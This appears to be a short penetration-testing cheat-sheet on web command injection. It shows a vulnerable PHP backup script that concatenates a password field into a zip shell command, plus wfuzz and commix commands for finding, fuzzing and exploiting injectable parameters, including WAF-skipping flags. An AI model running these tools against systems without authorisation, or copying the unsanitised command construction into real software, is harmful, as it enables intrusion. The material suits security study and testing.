# Web Attacks

## Identify Parameters
### Command Injection
**Hijacking a system command that takes a web parameter as part of the command.**
Links:
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
[HackTricks](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)

  1. Look for a parameter that **does** something with the OS/System. ie; a ping command, a backup/zip command, etc.  

Example PHP Code
```php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];
# In this example, we can terminate the zip command and execute code using the "Password" Parameter
```

**Using wfuzz to test for parameter existence**
```bash
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
```
## Exploitation
### Command injection
**Using commix to detect and exploit command injection**
```bash
commix --url="<URL>?<parameter>=" --level=3 --force-ssl --skip-waf --random-agent --cookie="<cookie>"
```
**Command Injection with POST data**
```bash
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
```
